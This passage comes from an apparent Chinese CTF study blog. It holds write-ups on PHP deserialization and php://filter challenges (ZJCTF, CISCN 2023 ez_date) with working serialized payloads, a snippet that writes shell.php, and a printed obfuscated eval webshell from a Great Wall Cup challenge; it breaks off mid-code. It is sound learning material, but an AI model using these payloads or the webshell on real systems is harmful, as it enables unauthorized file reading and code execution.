zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;file=flag.php;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后poc出了password的payload，  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:7:&quot;flagphp&quot;;&#125;<br></code></pre></td></tr></table></figure><p>但是传进去后只回显了个  </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br><br><br>oh u find <span class="hljs-keyword">it</span><br><br>U R SO CLOSE <span class="hljs-comment">!///COME ON PLZ</span><br></code></pre></td></tr></table></figure><p>最后去看别人的wp才知道flag就包含在这个页面下，按f12就能看到了😅<br>最终payload</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题我就只会最后构造反序列化的poc了<br>但也是学到了php伪协议的东西</p><h2 id="notice01"><a href="#notice01" class="headerlink" title="notice01"></a>notice01</h2><h2 id="KIMI-逐部分解析"><a href="#KIMI-逐部分解析" class="headerlink" title="KIMI:逐部分解析"></a>KIMI:逐部分解析</h2><p>include:<br>include 是 PHP 中的一个语句，用于动态包含另一个文件的内容到当前脚本中。<br>如果被包含的文件中包含 PHP 代码，这些代码会被执行。<br>php:&#x2F;&#x2F;filter:<br>php:&#x2F;&#x2F;filter 是一个伪协议，允许开发者在读取或写入数据时应用过滤器。它可以在数据流打开时对数据进行处理。<br>convert.base64-encode:<br>这是一个过滤器，表示对数据进行 Base64 编码。Base64 编码是一种将二进制数据转换为 ASCII 字符串的方法，常用于在需要以文本形式传输二进制数据的场景。<br>resource&#x3D;useless.php:<br>resource 参数指定了要处理的文件路径，这里是 useless.php。这意味着过滤器将应用于 useless.php 文件的内容。</p><hr><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter "></a>php:&#x2F;&#x2F;filter </h2><p>是 PHP 中一种独特的伪协议，它允许开发者在数据读取或写入过程中应用过滤器，从而实现对数据的处理。它是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，例如 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p><p>php:&#x2F;&#x2F;filter 协议的一般语法为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;action&gt;/resource=&lt;待过滤的数据流&gt;</span><br><br><span class="hljs-comment">//其中 &lt;action&gt; 表示要对数据执行的过滤操作，如读取（read）、转换编码（convert）或字符串操作（string）等；  </span><br><span class="hljs-comment">//&lt;待过滤的数据流&gt; 通常是要读取或写入的文件路径或 URL。</span><br><span class="hljs-comment">//过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理</span><br></code></pre></td></tr></table></figure><p>过滤器分类<br>字符串过滤器：以 string 开头，对数据进行字符串处理，如 rot13、toupper、tolower、strip_tags 等。<br>转换过滤器：以 convert 开头，对数据进行编码转换，如 Base64 编码、解码，Quoted-Printable 编码、解码，iconv 字符编码转换等。<br>压缩过滤器：如 zlib.deflate（压缩）、zlib.inflate（解压）、bzip2.compress（压缩）、bzip2.decompress（解压）等。<br>加密过滤器：如 mcrypt.* 和 mdecrypt.*，用于数据的加密和解密。不过，这个特性已自 PHP 7.1.0 起废弃，强烈建议不要使用。</p><p>示例<br>读取文件并进行 Base64 编码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br>这行代码会读取 index.php 文件的内容，并将其进行 Base64 编码后输出。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>));<br>这行代码会将 Base64 编码的字符串写入 shell.php 文件，<br>并在写入前进行 Base64 解码，最终 shell.php 文件中将包含原始的 <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span> 代码。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>unseirlize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-16</title>
    <link href="/2025/03/22/note-16/"/>
    <url>/2025/03/22/note-16/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>审计：<br>大概是三个变量a,b,file，还有一个反序列化激活的 __wakeup(),先是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br></code></pre></td></tr></table></figure><p>不让用数组绕过<br>然后是绕过条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )<br></code></pre></td></tr></table></figure><p>要求a和b弱比较不同，&amp;&amp;a和b的md5和sha1值相同<br>然后看不懂了  </p><blockquote><p>分析：<br>（1）wakeup方法首先禁用了数组，所以不能给成员变量a和b赋值数组，需要使用其他方法绕过下面的md5和sha1。<br>（2）因为比较变量使用的是弱比较（!&#x3D;&#x3D;），则我们可以给a、b赋值同值不同类，例如a&#x3D;1、b&#x3D;’1’，二者md5值和sha1值相同，可以通过检查。<br>（3）变量content接受经过date日期格式化后的变量file。<br>对于date()方法：<br>该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等<br>检测存在则会将格式化字符替换为当前时间的对应部分，否则将字符进行原样输出，同时可用转义字符将格式化字符原样输出<br>（4）uniqid()方法会生成一个唯一的文件名，并与后缀“.txt”拼接成变量uuid。<br>（5）file_put_contents()方法会将content的内容写入uuid表示的文本文档中。对文本文档的内容进行正则匹配，去除内容中的空格和换行符，赋值给变量打他。<br>（6）显示变量data的内容。<br>综上，我们需要绕过检测，为变量file赋值一个不会被date方法格式化的flag路径，读取到flag后，借由变量data显示出来。<br><a href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p></blockquote><p>重要的来了<br>KIMI:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//作用：尝试将$data作为文件路径，读取该路径下的文件内容并输出到浏览器。这里可能存在路径遍历或文件包含漏洞，如果$data的值可控且未经过充分验证。</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br><span class="hljs-comment">//作用：读取刚刚创建的$uuid文件的内容，并使用正则表达式preg_replace()去除其中的空白字符（包括空格、换行符等）。最终结果存储在$data变量中。</span><br></code></pre></td></tr></table></figure><p>最后payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;a)||<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;b))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no array&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;a !== <span class="hljs-variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;a) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;b)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;a)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;b)) )&#123;<br>            <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-comment">//同值不同类，通过三个检测</span><br><span class="hljs-variable">$a</span>-&gt;a=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$a</span>-&gt;b=<span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-comment">//此处file的内容在经过data()方法格式化后显示为/flag</span><br><span class="hljs-variable">$a</span>-&gt;file=<span class="hljs-string">&quot;/f\l\a\g&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//输出:Tzo0OiJkYXRlIjozOntzOjE6ImEiO2k6MTtzOjE6ImIiO3M6MToiMSI7czo0OiJmaWxlIjtzOjg6Ii9mXGxcYVxnIjt9</span><br><br></code></pre></td></tr></table></figure><p>by <a href="https://www.cnblogs.com/yuspace/p/18114039">https://www.cnblogs.com/yuspace/p/18114039</a></p><h2 id="值同类不同"><a href="#值同类不同" class="headerlink" title="值同类不同"></a>值同类不同</h2><p>$this-&gt;a !&#x3D;&#x3D; $this-&gt;b：  </p><p>$this-&gt;a 是整数 1，$this-&gt;b 是字符串 ‘1’。在 PHP 中，它们的值虽然相等，但类型不同，因此 !&#x3D;&#x3D; 比较结果为 true。</p><p>md5($this-&gt;a) &#x3D;&#x3D;&#x3D; md5($this-&gt;b)：</p><p>当你将整数 1 传递给 md5() 函数时，PHP 会将其转换为字符串 ‘1’，因此 md5(1) 和 md5(‘1’) 的结果是相同的。</p><p>sha1($this-&gt;a) &#x3D;&#x3D;&#x3D; sha1($this-&gt;b)：</p><p>同样，sha1() 函数也会将整数 1 转换为字符串 ‘1’，因此 sha1(1) 和 sha1(‘1’) 的结果也是相同的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-15</title>
    <link href="/2025/03/20/note-15/"/>
    <url>/2025/03/20/note-15/</url>
    
    <content type="html"><![CDATA[<h1 id="2024下半年长城杯回顾"><a href="#2024下半年长城杯回顾" class="headerlink" title="2024下半年长城杯回顾"></a>2024下半年长城杯回顾</h1><p>在机房上从新回顾3个月前的长城杯web题wp，发现已经能看懂不少了  </p><h2 id="追忆1-hello-web"><a href="#追忆1-hello-web" class="headerlink" title="追忆1 hello_web"></a>追忆1 hello_web</h2><p>还记得当初做这题就是在那干瞪眼，用dirsearch和查看前端认出了个hackme.php。<br>已经没有题目环境了，干看大佬的wp<br><a href="https://ya1orin.github.io/posts/cbe4da55.html">https://ya1orin.github.io/posts/cbe4da55.html</a></p><p>那大概就是双写..&#x2F;进行绕过来目录穿越访问到tips和hackme<br><strong>(主要是要学一下面对未知环境时该怎么办，现在还没有一套渗透流程，起手fuzz都fuzz不明白)</strong>   </p><p>然后能在tips看到phpinfo和过滤内容<br>然后是hackme.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$YwzIst</span>(<span class="hljs-string">&quot;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到大佬们说给反混淆一下就行了，我搞了两节课大约一个半小时才搞明白😫…..<br>步骤就是先按php的分号给分明白代码行，然后尝试用厨子解码里面看不懂的东西</p><p>这是我搞的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$lJbGIY</span>=<span class="hljs-string">&quot;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME&quot;</span>;<br><span class="hljs-variable">$OlWYMv</span>=<span class="hljs-string">&quot;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel&quot;</span>;<br><span class="hljs-variable">$lapUCm</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$YwzIst</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$OxirhK</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$YpAUWC</span>=<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$OxirhK</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$rVkKjU</span>=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$YwzIst</span>.=<span class="hljs-variable">$lapUCm</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$lapUCm</span>&#123;<span 